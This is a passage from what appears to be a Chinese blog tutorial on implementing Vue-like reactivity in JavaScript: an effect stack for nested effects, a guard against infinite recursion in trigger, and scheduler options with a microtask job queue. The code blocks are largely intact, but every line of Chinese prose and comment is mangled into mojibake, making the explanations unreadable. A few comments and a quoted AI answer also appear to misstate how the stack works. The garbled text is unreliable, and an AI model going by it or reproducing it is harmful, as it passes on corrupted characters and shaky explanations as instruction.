|--|<span class="hljs-attr">--effectFn2</span>
|<span class="hljs-attr">--foo</span>
|--|<span class="hljs-attr">--effectFn1</span>
</code></pre>
<p>æˆ‘ä»¬åœ¨æ‰§è¡Œ<code>obj.bar = false</code>çš„æ—¶å€™ï¼Œåº”è¯¥æ‰§è¡Œ <code>effectFn1</code></p>
<p>ä½†æ˜¯å®é™…ä¸Šå®ƒçš„æ‰§è¡Œå´æ˜¯ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c5ac62977f74d918347bd64b6ceec6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo6aOe6aOe6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666076&amp;x-signature=l6QNO5%2FQa2jK5Ll7rcL02hk9RHo%3D" alt="" loading="lazy"/></p>
<p>å®ƒé»˜è®¤æ‰§è¡Œçš„æ—¶å€™ é¡ºåºæ˜¯å¯¹çš„ï¼Œé”™è¯¯çš„æ˜¯æˆ‘ä»¬ä¿®æ”¹äº†barçš„å€¼ï¼Œå±…ç„¶æ‰§è¡Œåœ°effectFn 2 ï¼Œè€Œä¸æ˜¯ 1 ï¼Œä¸ºä»€ä¹ˆï¼Ÿ</p>
<p>åŸå› å…¶å®å°±è—åœ¨æˆ‘ä»¬çš„activeEffectä¸Šé¢</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//å…¨å±€å˜é‡å­˜å‚¨ ä¸´æ—¶å­˜å‚¨ éœ€è¦æ³¨å†Œçš„å‡½æ•°</span>
let activeEffect;
<span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
const registerEffect=(fn)=&gt;{
    if (!fn) return ;
    const effectFn=()=&gt;{
      <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
      <span class="hljs-built_in">cleanup</span>(effectFn)
      <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
      activeEffect = effectFn;
      <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
      <span class="hljs-built_in">fn</span>()
       }
    <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
    effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
    <span class="hljs-comment">//æ‰§è¡Œè¯¥å‡½æ•°</span>
    <span class="hljs-built_in">effectFn</span>()
}
</code></pre>
<p>ç”±äºæˆ‘ä»¬æ˜¯ä½¿ç”¨activeEffectæ¥ä¸´æ—¶ä¿å­˜å½“å‰çš„å‰¯ä½œç”¨å‡½æ•°ï¼Œè€Œä¸”å”¯ä¸€çš„ä¸€ä¸ªï¼Œä¸€æ—¦åµŒå¥—å‡½æ•°çš„å†…å±‚å‡½æ•°æ‰§è¡Œï¼Œå°±ä¼šæŠŠå†…å±‚å‡½æ•°è¦†ç›–å¤–å±‚å‡½æ•°çš„activeEffectçš„å€¼ï¼Œè€Œä¸”æ°¸è¿œæ— æ³•æ¢å¤ï¼Œè€Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ”¶é›†å¤–å±‚çš„å‰¯ä½œç”¨å‡½æ•°åˆ°ä¾èµ–ä¸­ï¼Œå°±ä¼šé”™è¯¯çš„æ·»åŠ ä¸Šå†…å±‚å‡½æ•°çš„åœ°å€ï¼Œ<strong>è¿™å°±æ˜¯åµŒå¥—å‡½æ•°çš„é—®é¢˜æ‰€åœ¨ï¼</strong></p>
<p>è§£å†³åŠæ³•å°±æ˜¯ï¼šåˆ©ç”¨æ ˆçš„ç‰¹æ€§ï¼Œæ¯ä¸€æ¬¡å‡½æ•°çš„è°ƒç”¨ï¼Œå°±ä¼šæ·»åŠ ä¸€å±‚æ ˆã€‚æ‰§è¡Œä¹‹å‰push æ‰§è¡Œä¹‹åpop</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//add---effect æ ˆ</span>
const effectStack = <span class="hljs-selector-attr">[]</span>
<span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
   const registerEffect=(fn)=&gt;{
   if (!fn) return ;
   const effectFn=()=&gt;{
      <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
      <span class="hljs-built_in">cleanup</span>(effectFn)
      <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
      activeEffect = effectFn;
      <span class="hljs-comment">//add---åœ¨è°ƒç”¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ ˆä¸­</span>
      effectStack<span class="hljs-selector-class">.push</span>(activeEffect)
      <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
      <span class="hljs-built_in">fn</span>()
       <span class="hljs-comment">//add--åœ¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°å¼¹å‡ºæ ˆ</span>
       effectStack<span class="hljs-selector-class">.pop</span>()
       <span class="hljs-comment">//å–å‡ºå‹åœ¨æ ˆåº•çš„å€¼</span>
       activeEffect = effectStack<span class="hljs-selector-attr">[effectStack.length-1]</span>
       }
   <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
   effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
    <span class="hljs-comment">//æ‰§è¡Œè¯¥å‡½æ•°</span>
   <span class="hljs-built_in">effectFn</span>()
   }
</code></pre>
<h3 data-id="heading-8">ç†è§£åå·®çš„åœ°æ–¹ï¼š</h3>
<p>æˆ‘ä¸€ç›´åœ¨æƒ³ï¼Œä¸ºä»€ä¹ˆfn()æ‰§è¡Œå®Œæ¯•åï¼Œ activeEffectçš„æ¢å¤ä¸æ˜¯ä½¿ç”¨effectStack.pop()ï¼Œåœ¨è¿™ä¸€å±‚æ‰§è¡Œçš„æ—¶å€™ï¼Œå®ƒåº”è¯¥æ˜¯ä¸¤ä¸¤ç›¸å¯¹çš„ï¼Œæˆ‘çš„å­å‡½æ•°fn()æ‰§è¡Œå®Œæ¯•ï¼Œæ‰§è¡Œçš„æ—¶æœºåˆ°äº†çˆ¶è¿™é‡Œï¼Œåœ¨çˆ¶çš„è¿™ä¸€å±‚ï¼Œæ ˆæ˜¯ä¸¤ä¸¤ç›¸å¯¹çš„ï¼Œ</p>
<p>æˆ‘ç›´æ¥å°±å¯ä»¥é€šè¿‡effectStack.pop() æ‹¿åˆ°è¿™ä¸€å±‚çš„å‘€ã€‚</p>
<hr/>
<p>ä½†æ˜¯å®é™…ä¸ŠactiveEffectçš„ä½¿ç”¨å¹¶ä¸æ˜¯è¿™æ ·æ‰§è¡Œçš„ã€‚</p>
<p>åœ¨fn()æ‰§è¡Œçš„æ—¶å€™ï¼Œå¦‚æœé‡Œé¢æœ‰è§¦å‘ä»£ç†å¯¹è±¡çš„getï¼Œå®ƒä¼šç«‹åˆ»æ‰§è¡Œï¼Œç«‹åˆ»å°±ä¼šè§¦å‘æ”¶é›†ä¾èµ–çš„å‡½æ•°ã€‚é‚£æˆ‘ä»¬çš„å‡½æ•°åˆšåˆšæ‰§è¡Œåˆ°äº†activeEffect=effectFn å°±ä¼šæ´¾ä¸Šç”¨åœºï¼Œå®ƒä¼šè¢«æ­£ç¡®çš„ä¿å­˜åˆ°å¯¹åº”çš„ set ä¸­ã€‚</p>
<p><strong>å½“ fn æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™ä¸€å±‚å¯¹åº”çš„effectFnæ’é™¤æ‰ï¼Œæ­£å¼æˆ‘ä»¬çŸ¥é“å®ƒæ˜¯ä¸¤ä¸¤ç›¸å¯¹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œä¸€è¿›ä¸€å‡ºï¼ŒæŠŠæˆ‘ä»¬è‡ªå·±çš„å½±å“æ¶ˆé™¤æ‰ï¼Œç„¶å æŠŠactiveEffectæ¢å¤åˆ°ä¸Šä¸€å±‚ã€‚</strong></p>
<p>å½“æ¢å¤åˆ°ä¸Šä¸€å±‚ä¹‹åï¼Œå®é™…ä¸Šå‡½æ•°çš„æ‰§è¡Œä¼šç»§ç»­å›åˆ°çˆ¶çš„fnä¸­ï¼Œç»§ç»­è¿›è¡Œå‰¯ä½œç”¨å‡½æ•°çš„ç»‘å®šï¼Œé‚£è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æ¢å¤çš„activeEffectå°±æ´¾ä¸Šäº†ç”¨åœºã€‚</p>
<h3 data-id="heading-9">çœ‹ AI çš„å›ç­”ï¼š</h3>
<blockquote>
<p>effectStackçš„ä½œç”¨åœ¨äºç®¡ç†åµŒå¥—çš„å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œç¡®ä¿åœ¨åµŒå¥—è°ƒç”¨ä¸­activeEffectçš„æ­£ç¡®æ€§ã€‚å®ƒæ˜¯ä½œä¸ºä¸€ä¸ªæ ˆï¼ˆstackï¼‰æ•°æ®ç»“æ„å®ç°çš„ï¼Œéµå¾ªâ€œåè¿›å…ˆå‡ºâ€ï¼ˆLIFO, Last In First Outï¼‰åŸåˆ™ã€‚è®©æˆ‘ä»¬ä¸€æ­¥æ­¥åˆ†æå®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼š</p>
<ol>
<li>å…¥å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œ: å½“è°ƒç”¨registerEffectæ—¶ï¼Œå†…éƒ¨å®šä¹‰çš„å‰¯ä½œç”¨å‡½æ•°effectFnè¢«æ‰§è¡Œã€‚åœ¨æ‰§è¡Œå‰ï¼Œé€šè¿‡activeEffect = effectFn;è®¾ç½®å½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°ï¼Œå¹¶å°†è¯¥å‡½æ•°å‹å…¥effectStack(effectStack.push(activeEffect)), è¿™ä¸€æ­¥æ˜¯ä¸ºäº†è®°å½•å‡½æ•°çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œç‰¹åˆ«æ˜¯å½“æœ‰åµŒå¥—çš„å‰¯ä½œç”¨å‡½æ•°è°ƒç”¨æ—¶ã€‚</li>
<li>åµŒå¥—è°ƒç”¨ç®¡ç†: å¦‚æœåœ¨æ‰§è¡ŒæŸä¸ªå‰¯ä½œç”¨å‡½æ•°æœŸé—´åˆè°ƒç”¨äº†å…¶ä»–å‰¯ä½œç”¨å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œåœ¨effectFn1å†…éƒ¨æ³¨å†Œå¹¶æ‰§è¡ŒeffectFn2ï¼‰ï¼Œè¿™ä¸ªæ–°å‰¯ä½œç”¨å‡½æ•°ä¹Ÿä¼šæŒ‰ç…§åŒæ ·çš„æµç¨‹è®¾ç½®è‡ªå·±ä¸ºactiveEffectå¹¶å‹å…¥æ ˆé¡¶ã€‚è¿™æ ·ï¼Œå³ä½¿åœ¨åµŒå¥—è°ƒç”¨ä¸­ï¼Œæ¯ä¸ªå±‚çº§çš„å‰¯ä½œç”¨å‡½æ•°éƒ½èƒ½å‡†ç¡®çŸ¥é“åœ¨å…¶æ‰§è¡ŒæœŸé—´è°æ˜¯å½“å‰çš„â€œæ´»è·ƒâ€å‰¯ä½œç”¨å‡½æ•°ã€‚</li>
<li>é€€å‡ºå‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œ: å½“ä¸€ä¸ªå‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œé€šè¿‡effectStack.pop()å°†å…¶ä»æ ˆä¸­ç§»é™¤ï¼Œç„¶åactiveEffect = effectStack[effectStack.length - 1];å°†activeEffectæ¢å¤ä¸ºä¸Šä¸€å±‚çš„å‰¯ä½œç”¨å‡½æ•°ã€‚è¿™æ ·åšç¡®ä¿äº†å½“åµŒå¥—è°ƒç”¨ç»“æŸæ—¶ï¼Œå¤–éƒ¨å‰¯ä½œç”¨å‡½æ•°èƒ½å†æ¬¡æˆä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°ã€‚</li>
</ol>
<p>é€šè¿‡è¿™æ ·çš„ç®¡ç†ï¼ŒeffectStackä¿è¯äº†åœ¨ä»»ä½•æ—¶å€™ï¼ŒactiveEffectéƒ½æŒ‡å‘äº†å½“å‰æ­£åœ¨æ‰§è¡Œçš„æœ€å¤–å±‚çš„å‰¯ä½œç”¨å‡½æ•°ã€‚è¿™å¯¹äºä¾èµ–æ”¶é›†ï¼ˆåœ¨trackå‡½æ•°ä¸­ï¼‰å’Œä¾èµ–è§¦å‘ï¼ˆåœ¨triggerå‡½æ•°ä¸­ï¼‰è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒè®©ç³»ç»Ÿèƒ½å¤Ÿå‡†ç¡®åœ°çŸ¥é“å“ªäº›å‡½æ•°éœ€è¦åœ¨æ•°æ®å˜åŒ–æ—¶é‡æ–°æ‰§è¡Œï¼Œä»è€Œå®ç°äº†å“åº”å¼æ•°æ®ç»‘å®šçš„é€»è¾‘ã€‚</p>
</blockquote>
<h2 data-id="heading-10">06-é¿å…æ— é™é€’å½’å¾ªç¯</h2>
<p>ä¸ºä»€ä¹ˆä¼šå‡ºç°æ— é™é€’å½’å¾ªç¯çš„é—®é¢˜å‘¢ï¼Ÿ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> data = {<span class="hljs-attr">foo</span>:<span class="hljs-number">1</span>}
<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>()
<span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
    obj.<span class="hljs-property">foo</span>++
})
</code></pre>
<p>å½“æˆ‘ä»¬è¿è¡Œå¦‚ä¸Šä»£ç çš„æ—¶å€™ï¼Œå°±ç›¸å½“äºå¼€å¯äº†æ— é™é€’å½’æ¨¡å¼ã€‚</p>
<p>æˆ‘ä»¬ä¸æ–­åœ¨æ³¨å†Œçš„å‰¯ä½œç”¨å‡½æ•°ä¸­æ‰§è¡Œ</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">obj.foo</span> = obj.foo+<span class="hljs-number">1</span>
</code></pre>
<p>å®ƒæ—¢è¯»å–åˆè®¾ç½®ã€‚</p>
<p>é‚£ä¹ˆåº”è¯¥æ€ä¹ˆé¿å…è¿™ç§æƒ…å†µå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬çŸ¥é“ activeEffect å®é™…å°±æ˜¯å½“å‰æ¿€æ´»çš„è¦æ·»åŠ åˆ°ä¾èµ–åºåˆ—ä¸­çš„å‰¯ä½œç”¨å‡½æ•°ï¼Œæˆ‘ä»¬åˆ¤æ–­ä¸€ä¸‹ï¼Œå½“å‰æ‰§è¡Œçš„å‡½æ•°æ˜¯å¦å’ŒactiveEffectæ˜¯å¦ç›¸åŒ å°±å¯ä»¥å®ç° é¿å…æ— é™é€’å½’å¾ªç¯ã€‚</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">//åœ¨setå‡½æ•°ä¸­è¿½è¸ªå±æ€§çš„å˜åŒ–</span>
<span class="hljs-keyword">const</span> trigger=(target,key)=&gt;{
   <span class="hljs-comment">//æ ¹æ®targetæ‹¿åˆ°å¯¹åº”çš„æ¡¶ è¿›è¡Œæ‰§è¡Œ</span>
   let depsMap = bucket.<span class="hljs-keyword">get</span>(target)
   <span class="hljs-keyword">if</span>(!depsMap) <span class="hljs-keyword">return</span> ;
   <span class="hljs-comment">//æ‹¿åˆ°å±æ€§å¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ—</span>
   <span class="hljs-keyword">const</span> effects = depsMap.<span class="hljs-keyword">get</span>(key)
       <span class="hljs-comment">//add - ä½¿ç”¨ä¸€ä¸ªæ–°çš„setæ–¹æ³• é¿å…æ— é™å¾ªç¯æ‰§è¡Œ</span>
       <span class="hljs-keyword">const</span> effectToRun = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Set</span>()
       effects.forEach(effectFn=&gt;{
          <span class="hljs-keyword">if</span>(effectFn !== activeEffect){
             effectToRun.add(effectFn)
           }
        })
       effectToRun.forEach(effectFn=&gt;effectFn())
}
</code></pre>
<h2 data-id="heading-11">07-è°ƒåº¦æ‰§è¡Œ</h2>
<p>ä»€ä¹ˆæ˜¯è°ƒåº¦æ‰§è¡Œï¼Ÿ</p>
<p>å°±æ˜¯trigger è§¦å‘ å‰¯ä½œç”¨å‡½æ•°é‡æ–°æ‰§è¡Œæ—¶ï¼Œ<strong>æœ‰èƒ½åŠ›æ§åˆ¶ æ‰§è¡Œçš„æ—¶æœºï¼Œæ¬¡æ•°å’Œæ–¹å¼</strong>ã€‚</p>
<h3 data-id="heading-12">æ‰§è¡Œçš„æ—¶æœº</h3>
<p>å‡å¦‚æˆ‘ä»¬æƒ³è¦å®ç°å¦‚ä¸‹çš„æ•ˆæœï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> data = {<span class="hljs-attr">foo</span>:<span class="hljs-number">1</span>}
<span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(...)
<span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">foo</span>)
})
obj.<span class="hljs-property">foo</span>++
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ç»“æŸäº†'</span>)
</code></pre>
<p>å®ƒçš„æ‰“å°é¡ºåºæ˜¯</p>
<pre><code class="hljs">1
2
ç»“æŸäº†
</code></pre>
<p>ç°åœ¨æˆ‘ä»¬éœ€è¦çš„æ•ˆæœæ˜¯ï¼š</p>
<pre><code class="hljs">1
ç»“æŸäº†
2
</code></pre>
<p>åº”è¯¥å¦‚ä½•å®ç°å‘¢ï¼Ÿ</p>
<p>å®é™…å®ƒå°±æ˜¯åœ¨æ‰§è¡Œçš„å‰¯ä½œç”¨å‡½æ•°çš„æ—¶å€™æ·»åŠ äº†ä¸€ä¸ªå®ä»»åŠ¡ï¼Œè®©å®ƒå»¶è¿Ÿæ‰§è¡Œï¼Œé—®é¢˜æ˜¯æˆ‘åº”è¯¥æ€ä¹ˆæ·»åŠ å‘¢ï¼Ÿ</p>
<p>æˆ‘éœ€è¦ä¼ é€’ä¸€ä¸ªå‚æ•°è¿›å»ï¼Œåœ¨å‡½æ•°æ‰§è¡Œçš„æ—¶å€™åˆ¤æ–­ï¼Œæˆ‘ä¼ å…¥çš„è¿™ä¸ªå‚æ•°åœ¨ä¸åœ¨ï¼Œå¦‚æœå­˜åœ¨å°±æ‰§è¡Œæˆ‘çš„å‡½æ•°ï¼Œ</p>
<p>ç„¶åæˆ‘åœ¨æˆ‘çš„å‡½æ•°é‡Œé¢åŠ ä¸Šå»¶è¿Ÿçš„åŠŸèƒ½ï¼Œå°±å®ç°äº†ã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
   const registerEffect=(fn,options = {})=&gt;{
   if (!fn) return ;
   const effectFn=()=&gt;{
      <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
      <span class="hljs-built_in">cleanup</span>(effectFn)
      <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
      activeEffect = effectFn;
      <span class="hljs-comment">//åœ¨è°ƒç”¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ ˆä¸­</span>
      effectStack<span class="hljs-selector-class">.push</span>(activeEffect)
      <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
      <span class="hljs-built_in">fn</span>()
           <span class="hljs-comment">//åœ¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°å¼¹å‡ºæ ˆ</span>
           effectStack<span class="hljs-selector-class">.pop</span>()
           <span class="hljs-comment">//å–å‡ºå‹åœ¨æ ˆåº•çš„å€¼</span>
           activeEffect = effectStack<span class="hljs-selector-attr">[effectStack.length-1]</span>
       }
   <span class="hljs-comment">//add--å°†optionsæŒ‚åœ¨åˆ°å¯¹åº”çš„effectFnä¸Šé¢</span>
       effectFn<span class="hljs-selector-class">.options</span> = options
   <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
   effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
    <span class="hljs-comment">//æ‰§è¡Œè¯¥å‡½æ•°</span>
   <span class="hljs-built_in">effectFn</span>()
   }
</code></pre>
<p>æˆ‘ä»¬åœ¨æ³¨å†Œå‡½æ•°çš„æ—¶å€™æ·»åŠ ä¸€ä¸ªå‚æ•°<code>options</code> ï¼ŒæŠŠå®ƒæŒ‚åœ¨åˆ°å¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°ä¸Šé¢ <code>effectFn</code>.</p>
<p>ç„¶åå†æ‰§è¡Œçš„æ—¶å€™åˆ¤æ–­ æ˜¯å¦å­˜åœ¨å¯¹åº”çš„è°ƒåº¦å™¨<code>scheduler</code> ï¼Œå¦‚æœå­˜åœ¨ å°±æ‰§è¡Œï¼Œå¹¶æŠŠå½“å‰çš„å‰¯ä½œç”¨å‡½æ•°ä¼ å…¥è¿›å»ä½œä¸ºå‚æ•°</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//åœ¨setå‡½æ•°ä¸­è¿½è¸ªå±æ€§çš„å˜åŒ–</span>
const trigger=(target,key)=&gt;{
   <span class="hljs-comment">//æ ¹æ®targetæ‹¿åˆ°å¯¹åº”çš„æ¡¶ è¿›è¡Œæ‰§è¡Œ</span>
   let depsMap = bucket<span class="hljs-selector-class">.get</span>(target)
   <span class="hljs-built_in">if</span>(!depsMap) return ;
   <span class="hljs-comment">//æ‹¿åˆ°å±æ€§å¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°é˜Ÿåˆ—</span>
   const effects = depsMap<span class="hljs-selector-class">.get</span>(key)
   <span class="hljs-comment">//add - ä½¿ç”¨ä¸€ä¸ªæ–°çš„setæ–¹æ³• é¿å…æ— é™å¾ªç¯æ‰§è¡Œ</span>
   const effectToRun = new <span class="hljs-built_in">Set</span>()
   effects<span class="hljs-selector-class">.forEach</span>(effectFn=&gt;{
      if(effectFn !== activeEffect){
         effectToRun<span class="hljs-selector-class">.add</span>(effectFn)
      }
   })
   effectToRun<span class="hljs-selector-class">.forEach</span>(effectFn=&gt;{
      //add--åˆ¤æ–­å½“å‰çš„å‰¯ä½œç”¨å‡½æ•°ä¸Šé¢æ˜¯å¦å­˜åœ¨è°ƒåº¦å™¨
      if(effectFn.options.scheduler){
         effectFn<span class="hljs-selector-class">.options</span><span class="hljs-selector-class">.scheduler</span>(effectFn)
           }else{
         <span class="hljs-built_in">effectFn</span>()
           }
       })
}
</code></pre>
<p>æ¥ç€çœ‹ä¸€ä¸‹æ•ˆæœï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">registerEffect</span>(()=&gt;{
console<span class="hljs-selector-class">.log</span>(obj.foo)
  },{
<span class="hljs-built_in">scheduler</span>(fn){
   <span class="hljs-built_in">setTimeout</span>(fn)
      }
  })
  obj<span class="hljs-selector-class">.foo</span>++
  console<span class="hljs-selector-class">.log</span>('ç»“æŸäº†')

<span class="hljs-number">1</span>
ç»“æŸäº†
<span class="hljs-number">2</span>
</code></pre>
<p>å®Œç¾å®ç°ã€‚</p>
<h3 data-id="heading-13">è°ƒåº¦å™¨ä¸æ§åˆ¶æ‰§è¡Œå¤šæ¬¡</h3>
<p>éœ€æ±‚ï¼š</p>
<pre><code class="hljs">obj.foo++
obj.foo++
</code></pre>
<p>ç»“æœè™½ç„¶æ˜¯ä» 1 åŠ åˆ° 2 åŠ åˆ° 3</p>
<p>ä½†æ˜¯ æˆ‘ä»¬åªæƒ³è¦æœ€åçš„ä¸€æ¬¡ ä¸­é—´çš„çŠ¶æ€ä¸æƒ³è¦ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<pre><code class="hljs language-javascript" lang="javascript">
  <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªä»»åŠ¡é˜Ÿåˆ—</span>
  <span class="hljs-keyword">const</span> jobQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>()
  <span class="hljs-comment">//ä½¿ç”¨Promise.resolveåˆ›å»ºä¸€ä¸ªpromiseå®ä¾‹ï¼Œæˆ‘ä»¬ç”¨å®ƒå°†ä¸€ä¸ªä»»åŠ¡æ·»åŠ åˆ°å¾®ä»»åŠ¡é˜Ÿåˆ—é‡Œé¢</span>
  <span class="hljs-keyword">const</span> p = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>()
  <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªæ ‡è¯† æ˜¯å¦æ­£åœ¨åˆ·æ–°é˜Ÿåˆ—</span>
  <span class="hljs-keyword">let</span> isFlushing = <span class="hljs-literal">false</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">flushJob</span>(<span class="hljs-params"/>){
<span class="hljs-comment">//å¦‚æœä»»åŠ¡é˜Ÿåˆ—æ­£åœ¨åˆ·æ–° åˆ™ä»€ä¹ˆéƒ½ä¸åš</span>
      <span class="hljs-keyword">if</span>(isFlushing){
           <span class="hljs-keyword">return</span>
          }
        isFlushing = <span class="hljs-literal">true</span>
        p.<span class="hljs-title function_">then</span>(<span class="hljs-function">()=&gt;</span>{
        <span class="hljs-comment">//åœ¨å¾®ä»»åŠ¡ä¸­æ‰§è¡Œ ä¼šå»¶è¿Ÿ</span>
           jobQueue.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">job</span>=&gt;</span><span class="hljs-title function_">job</span>())
              }).<span class="hljs-title function_">finally</span>(<span class="hljs-function">()=&gt;</span>{
           isFlushing = <span class="hljs-literal">false</span>
              })
  }

  <span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">foo</span>)
      },
      {
        <span class="hljs-title function_">scheduler</span>(<span class="hljs-params">fn</span>){
           <span class="hljs-comment">//æ¯æ¬¡è°ƒåº¦çš„æ—¶å€™ æŠŠå‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°jobQueueé˜Ÿåˆ—ä¸­</span>
           jobQueue.<span class="hljs-title function_">add</span>(fn)
          <span class="hljs-title function_">flushJob</span>()
      }
  })
  obj.<span class="hljs-property">foo</span>++
  obj.<span class="hljs-property">foo</span>++
  obj.<span class="hljs-property">foo</span>++
  obj.<span class="hljs-property">foo</span>++
  
 æ‰§è¡Œç»“æœï¼š
 <span class="hljs-number">1</span>
 <span class="hljs-number">5</span>
</code></pre>
<p>åŸç†ï¼š</p>
<ul>
<li>åˆ©ç”¨setçš„ç‰¹æ€§ é‡å¤çš„fnåªä¼šæ·»åŠ ä¸€æ¬¡</li>
<li>åˆ©ç”¨å¾®æœåŠ¡çš„æ‰§è¡Œæ—¶æœºï¼Œå¾®æœåŠ¡å®ƒçš„æ‰§è¡Œæ˜¯åœ¨å½“å‰å®ä»»åŠ¡æ‰§è¡Œå®Œæ¯•ä»¥åæ‰ä¼šæŸ¥æ‰¾åˆ¤æ–­å¾®ä»»åŠ¡é˜Ÿåˆ—ã€‚</li>
</ul>
<p>åœ¨æˆ‘ä»¬ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬è™½ç„¶æ·»åŠ äº†å¤šæ¬¡fn å¹¶ä¸”åˆ·æ–°äº†å¤šæ¬¡flushJob()ï¼Œå®é™…ä¸Šå®ƒå¹¶æ²¡æœ‰å¤šæ¬¡æ‰§è¡Œã€‚</p>
